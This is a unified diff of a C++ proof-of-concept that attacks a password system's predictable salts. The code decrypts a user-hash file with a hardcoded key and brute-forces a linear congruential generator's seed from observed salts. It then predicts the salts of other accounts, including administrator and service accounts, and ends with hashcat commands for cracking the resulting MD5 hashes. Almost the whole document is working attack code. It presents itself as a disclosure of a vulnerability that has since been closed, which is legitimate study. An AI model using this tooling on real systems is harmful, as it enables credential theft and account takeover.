@@ -1,18 +1,21 @@
 #include <stdio.h>
 #include <memory.h>
 #include <string.h>
+#include <stdint.h>
+#include <inttypes.h>
 #include <string>
 #include <iostream>
 #include <iomanip>
 #include <cctype>
 #include <map>
+#include <numeric>
 #include <list>
 #include <algorithm>
 #include <fstream>
 #include <cmath>
 #include <ios>
 #include <vector>
-
+#include <bit>
 /*
  * PLEASE BE AWARE THAT THE VULNERABILITY HAS BEEN IDENTIFIED AND SUCCESSFULLY CLOSED.
  * NO KNOWN ATTACKS HAVE BEEN EXECUTED USING THIS VULNERABILITY AND NO DATA WAS OBTAINABLE BY THIRD PARTIES.
@@ -36,7 +39,7 @@
  * This is a demonstrative(1) recovery attack with which any low privilege user of the system
  * can potentially steal user credentials and perform actions using a different identity,
  * this works by exploiting the password reset feature shortly after a finished update cycle
- * in order for the attacker to map possible prng seeds to hash salts for hash predictions.
+ * in order for the attacker to map possible prng sequences to salts for hash predictions.
  *
  * (1): Assumptions regarding the customer environment were made upfront,
  *      which might not be accurately representative.
@@ -174,6 +177,17 @@ public:
     this->_type = other._type;
     return *this;
   }
+  am_hash& operator=(am_hash& other) {
+    this->_hash = other._hash;
+    this->_type = other._type;
+    return *this;
+  }
+  am_hash& operator+(const std::string hex) {
+  return this->operator+(hex.c_str());
+  }
+  am_hash& operator+(const std::string hex) const {
+  return this->operator+(hex.c_str());
+  }
   am_hash& operator+(const char* hex) {
     std::string str = hex;
     for(auto & c: str)
@@ -182,6 +196,9 @@ public:
       this->_hash = add_hex(this->_hash, str);
     }
     return *this;
+  }
+  am_hash& operator-(const std::string hex) {
+  return this->operator-(hex.c_str());
   }
   am_hash& operator-(const char* hex) {
     std::string str = hex;
@@ -192,14 +209,17 @@ public:
     }
     return *this;
   }
-  const char* c_str() {
+  const char* c_str() const {
     return this->_hash.c_str();
   }
-  std::string& str() {
+  const std::string& str() const {
     return this->_hash;
   }
   const char* type() {
     return enum_str(this->_type);
+  }
+  bool empty() {
+    return this->_hash.empty();
   }
   const char* enum_str(hashtype n) {
     switch(n) {
@@ -275,27 +295,27 @@ public:
   }
   std::map<char, int> hex_value_of_dec(void) {
     std::map<char, int> map {
-      { '0', 0 }, { '1', 1 },
-      { '2', 2 }, { '3', 3 },
-      { '4', 4 }, { '5', 5 },
-      { '6', 6 }, { '7', 7 },
-      { '8', 8 }, { '9', 9 },
-      { 'A', 10 }, { 'B', 11 },
-      { 'C', 12 }, { 'D', 13 },
-      { 'E', 14 }, { 'F', 15 }
+      {'0', 0}, {'1', 1},
+      {'2', 2}, {'3', 3},
+      {'4', 4}, {'5', 5},
+      {'6', 6}, {'7', 7},
+      {'8', 8}, {'9', 9},
+      {'A', 10}, {'B', 11},
+      {'C', 12}, {'D', 13},
+      {'E', 14}, {'F', 15}
     };
     return map;
   }
   std::map<int, char> dec_value_of_hex(void) {
     std::map<int, char> map {
-      { 0, '0' }, { 1, '1' },
-      { 2, '2' }, { 3, '3' },
-      { 4, '4' }, { 5, '5' },
-      { 6, '6' }, { 7, '7' },
-      { 8, '8' }, { 9, '9' },
-      { 10, 'A' }, { 11, 'B' },
-      { 12, 'C' }, { 13, 'D' },
-      { 14, 'E' }, { 15, 'F' }
+      {0, '0'}, {1, '1'},
+      {2, '2'}, {3, '3'},
+      {4, '4'}, {5, '5'},
+      {6, '6'}, {7, '7'},
+      {8, '8'}, {9, '9'},
+      {10, 'A'}, {11, 'B'},
+      {12, 'C'}, {13, 'D'},
+      {14, 'E'}, {15, 'F'}
     };
     return map;
   }
@@ -390,7 +410,7 @@ public:
  */
 template<typename T>
 requires requires(T x) {
-  {x.str()} -> std::same_as<std::string&>;
+  {x.str()} -> std::same_as<const std::string&>;
   {x = x.c_str()} -> std::same_as<T&>;
 }
 T bit_mask(T& hash, T& salt, std::string& out) {
@@ -408,7 +428,7 @@ T bit_mask(T& hash, T& salt, std::string& out) {
       number_y += hash.str()[i];
       lock = true;
     }
-  z = hexs_to_ul(number_x) - hexs_to_ul(number_y);
+  z = ul(number_x) - ul(number_y);
   convert << std::dec << z;
   out = convert.str();
   T res = result.c_str();
@@ -419,74 +439,95 @@ T bit_mask(T& hash, T& salt, std::string& out) {
 /*
  * Linear congruential generator solver predicting random numbers
  * based on a discontinuous piecewise linear equation, will be used
- * to crack GLIBC's rand() pseudo-random number generator.
+ * to crack GLIBC's rand() pseudo-random number generator with brute force.
+ * Can give false positivies when range between number and seed is too large.
  * https://www.mathstat.dal.ca/~selinger/random/
  */
-class lcgs {
-public:
-  int r[344+10];
-  std::vector<int> a;
-  int i, j, s;
-  lcgs() : a(10) {}
-  std::vector<int>& operator()(int rand) {
-    for(int i = 0; i < 20000000; i++) {
-      std::vector<int>& p = fast_rand(i);
-      std::vector<int>::iterator t = std::find(std::begin(p), std::end(p), rand);
-      bool exists = t != std::end(p);
-      if(exists) {
-        j = t - std::begin(p);
-        s = i;
-        break;
-      }
-    }
-    return a;
+// x_n = A * x_{n-1} + B mod C mod R
+template<uint64_t A0, uint64_t B0, uint64_t C0, uint64_t R>
+class rlcg {
+  public: rlcg(): M(R << 1) {}
+  rlcg(std::vector < uint64_t > y): M(R << 1), INVA(inva()) {
+    this->sequence = this->operator()(y);
   }
-  std::vector<int>& rand() {
-    fast_rand(s);
-    return a;
+  uint64_t M, INVA;
+  std::vector<uint64_t> sequence;
+  uint64_t inva() {
+    auto ina = [&](uint64_t v) -> uint64_t {
+      return v * (2 - v * A0);
+    };
+    return ina(ina(ina(ina(A0)))) & (M - 1);
   }
-  int seed() {
-    return s;
+  std::vector<uint64_t>& solution() {
+    return this->sequence;
   }
-  lcgs& seed(int seed) {
-    s = seed;
-    return *this;
-  }
-  int index() {
-    return j;
-  }
-  int mask() {
-    double ret = 0;
-    for(int k = 0; k < 10; k++) {
-      ret += ul_to_hexs(a[k]).length();
+  std::vector<uint64_t> operator()(std::vector<uint64_t> y) {
+    const uint64_t y0 = y[0], y1 = y[1];
+    int64_t x0 = (uint64_t)(((M >> 1) - y0) / R * R + y0) << 1 | 0xffff;
+    uint64_t xn[10] = {};
+    // 0 <= xf <= xn
+    uint64_t xf = 0;
+    std::cout << "f(x_n) = ((uint64_t)((x_n = " << A0 << " * x_n-1 + " << B0 << ") >> 1) & 0x" << toHex(C0) << ") % " << R << std::endl;
+    std::cout << "y0 = " << y0 << " y1 = " << y1 << std::endl;
+    std::vector<uint64_t> solution;
+    while(x0 >= 0) {
+      uint64_t x1 = A0 * (uint64_t) x0 + B0;
+      do {
+        // assert((x0 >> 1) % R == y0);
+        // assert(x1 == A * (uint32_t)x0 + B);
+        if(((x1 >> 1) & (C0)) % R == y1) {
+          uint64_t x = x1, n;
+          for(n = 2; n < y.size(); ++n)
+            if((((x = A0 * x + B0) >> 1) & (C0)) % R != y[n])
+              goto nxt;
+          // found a solution
+          x = (INVA * ((uint64_t) x0 - B0)) & (M - 1);
+          for(uint64_t i = 0; i <= xf; i++) {
+            if(xn[i] == x)
+              goto end;
+          }
+          xn[xf] = x;
+          std::vector<uint64_t> seeds;
+          seeds.push_back(x);
+          for(uint64_t i = 0; i < 4; i++) {
+            seeds.push_back((INVA * ((uint64_t) seeds[i] - B0)) & (M - 1));
+          }
+          std::cout << "x0 can be " << x0 << ", that is seeds={" << join(seeds, comma) << "} modulo " << R << ", yielding:" << std::endl;
+          // prove out point by showing the output
+          std::vector<uint64_t> sequence;
+          uint64_t xfn = x;
+          std::cout << "=> ";
+          for(n = 0; n < 10; ++n) {
+            uint64_t r = ((uint64_t)((xfn = A0 * xfn + B0) >> 1) & (C0)) % R;
+            sequence.push_back(r);
+            std::cout << r << ',';
+          }
+          std::cout << std::endl;
+          std::vector<uint64_t> back;
+          uint64_t xbn = x0;
+          std::cout << "<= ";
+          for(n = 0; n < 10; ++n) {
+            uint64_t r = (((xbn = (INVA * ((uint64_t) xbn - B0))) >> 1) & (C0)) % R;
+            back.push_back(r);
+            std::cout << r << ',';
+          }
+          std::reverse(back.begin(), back.end());
+          if(sequence[0] == y0 && sequence[1] == y1) {
+            sequence.erase(sequence.begin(), sequence.begin() + 2);
+            back.insert(back.end(), sequence.begin(), sequence.end());
+            solution = back;
+          }
+          std::cout << std::endl;
+          ++xf;
+        }
+        nxt:
+          x1 -= (uint64_t) A0;
+      } while (((x0--) & 0xffff) != 0);
+      x0 -= (int64_t)(R - 1) << 1;
     }
-    ret = std::ceil(ret / 10);
-    if((int)ret % 2)
-      ret += 1;
-    return (int)ret;
-  }
-  std::vector<int>& fast_rand(int seed) {
-    r[0] = seed;
-    /*
-     * n = a*n' mod m (+c)
-     */
-    for (i=1; i<31; i++) {
-      r[i] = (16807LL * r[i-1]) % 2147483647;
-      if (r[i] < 0) {
-        r[i] += 2147483647;
-      }
-    }
-    for (i=31; i<34; i++) {
-      r[i] = r[i-31];
-    }
-    for (i=34; i<344; i++) {
-      r[i] = r[i-31] + r[i-3];
-    }
-    for (i=344; i<344+10; i++) {
-      r[i] = r[i-31] + r[i-3];
-      a[i-344] = ((unsigned int)r[i]) >> 1;
-    }
-    return a;
+    end:
+      std::cout << xf << " solution(s)" << std::endl << std::endl;
+    return solution;
   }
 };
 
@@ -496,20 +537,24 @@ public:
  * @param text JSON string with named object which is skipped.
  * @return allocated map filled with user entries, unfortunate pointer.
  */
-std::map<std::string, std::string>* users(std::string& text) {
-  auto map = new std::map<std::string, std::string>;
+std::map<std::string, std::string> users(std::string& text, int count) {
+  std::map<std::string, std::string> map;
+  size_t m_k = 0;
+  auto nextqtd = [&](std::string text) -> std::string {
+        size_t x = text.find('\"', m_k);
+        size_t y = text.find('\"', x+1);
+        m_k = y+1;
+        return text.substr(x+1, y-x-1);
+  };
   nextqtd(text); // move cursor to first username
-  for(int i = 0; i < 4; i++) {
+  for(int i = 0; i < count; i++) {
     std::string key = nextqtd(text), val = nextqtd(text);
-    map->insert(std::pair<std::string,std::string>(key, val));
+    map.insert(std::pair<std::string,std::string>(key, val));
   }
   return map;
 }
 
-//######################################################################
-
 int main() {
-  lcgs lcgs;
   sha256<am_hash> sha256;
   md5<am_hash> md5;
   aes128 aes128;
@@ -539,42 +584,19 @@ int main() {
    * @param h List of salted hashes.
    * @param n Prng sequence.
    */
-  auto predict = [&](std::list<std::string> h, std::vector<int>& n) -> std::string {
+  auto predict = [&](std::list<std::string> h, std::vector<uint64_t>& n) -> std::string {
     std::stringstream str;
     for(auto& h1 : h) {
       am_hash d, h2 = h1.c_str();
       for(auto& i : n) {
         d = h2;
         // Hash guesses based on prng prediction
-        am_hash s = d - ul_to_hexs(i).c_str();
+        am_hash s = d - hexstr(i);
         str << s.str() << std::endl;
       }
-      str << h2.str().
-             substr(0, h2.str().length() - lcgs.mask()).
-             append(lcgs.mask(), '*') << std::endl;
     }
     return str.str();
   };
-
-  /*
-   * Vulnerable code snippet
-   * mode = am_hash($pass) + $salt.rand
-   *
-   * srand(time(NULL)); //=> srand(16743298)
-   * rand(); rand();
-   * std::string key = "MyKey123";
-   * am_hash h1 = "example", h2 = "example", h3 = "example";
-   * h1 = h1 + ul_to_hexs(rand()).c_str();
-   * h2 = h2 + ul_to_hexs(rand()).c_str();
-   * h3 = h3 + ul_to_hexs(rand()).c_str();
-   * std::string json = "{\n\
-   * \"USERS\": {\n\
-   *   \"USER1\": \"" + h1.str() + "\",\n\
-   *   \"USER2\": \"" + h2.str() + "\",\n\
-   *   \"USER3\": \"" + h3.str() + "\",\n\
-   * }\n}";
-   * std::cout << format(aes128.encrypt(json, key)) << std::endl;
-   */
 
   std::string key = "MyKey123";
   std::ifstream f("data.js.aes");
@@ -582,24 +604,33 @@ int main() {
   buffer << f.rdbuf();
   std::string text = unformat(buffer.str());
   text = aes128.decrypt(text, key);
-  std::cout << text << std::endl;
+  std::cout << text << std::endl << std::endl;
 
-  // Attack: CWE-760 Use of a One-Way Hash with a Predictable Salt
-  //am_hash($pass) + $salt.prng =>
-  //am_hash($pass + $salt.crng)
+  // Attak part 1: CWE-338 Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
+  // Uses a Pseudo-Random Number Generator (PRNG) in a security context, but the PRNG's algorithm is not cryptographically strong.
+  //f(x_n+1) = (a * x_n + c) >> d mod m => f^-1(y_n) = a^-1 * (y_n - c) >> d mod m
 
-  std::map<std::string, std::string>& map = (*users(text));
-  std::string o = salt(map["USER1"], "test1234");
-  std::cout << "$salt.rand=" << o << std::endl << std::endl;
-  std::vector<int>& n = lcgs(std::stoi(o)); // ~21 hours
-  std::cout << "$salt.rand.seed=" << lcgs.seed() << std::endl;
-  std::cout << predict({map["USER2"], map["USER3"]}, n) << std::endl;
+  std::map<std::string, std::string> map = users(text, 6);
+  std::string o1 = salt(map["alex-presenter"], "alex1"), o2 = salt(map["alex-operator"], "alex2");
+  uint64_t p1 = std::stoul(o1), p2 = std::stoul(o2);
+  std::cout << "$salt.rand.o1=" << p1 << "; " << std::bit_ceil(p1) << std::endl;
+  std::cout << "$salt.rand.o2=" << p2 << "; " << std::bit_ceil(p2) << std::endl << std::endl;
 
-  // Hashcat strategies used to compromise accounts:
-  //hashcat.exe -m 0 ./md5_salt_guess.hash -a 0 ./rockyou-extended.dict &
-  //hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -1 "!$??" ./rockyou-extended ?1
-  //hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -1 "@#%&*" ./rockyou-extended ?1
-  //hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -1 "12347890" -2 "!$??" ./rockyou-extended ?1?2
+  rlcg<25214903917, 11, ((uint64_t)(-1ull) >> 16), (uint64_t)(-1u) + 1> rlcg({p1, p2});
+  for(auto s : {map["roger.dennis"], map["johnny.peters"], map["service"], map["administrator"]}) {
+    if(!rlcg.solution().empty())
+      std::cout << predict({s}, rlcg.solution()) << std::endl;
+  }
+
+  // Attack part 2: CWE-760 Use of a One-Way Hash with a Predictable Salt
+  // One-way cryptographic hash against an input that should not be reversible, such as a password, but uses a predictable salt as part of the input.
+  //hash := md5($pass) + $salt.prng => hash - $salt.prng
+
+  // Hashcat strategies:
+  /* hashcat.exe -m 0 ./md5_salt_guess.hash -a 0 -d 1 ./rockyou-extended.dict & hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -d 1 -1 "!$??" ./rockyou-extended.dict ?1 &^
+hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -d 1 -1 "@#%&*" ./rockyou-extended.dict ?1 & hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -d 1 -1 "12347890" -2 "!$??" ./rockyou-extended.dict ?1?2 &^
+hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -d 1 -1 "12347890" ./rockyou-extended.dict ?1 & more hashcat.potfile
+   */
 
   return 0;
 }
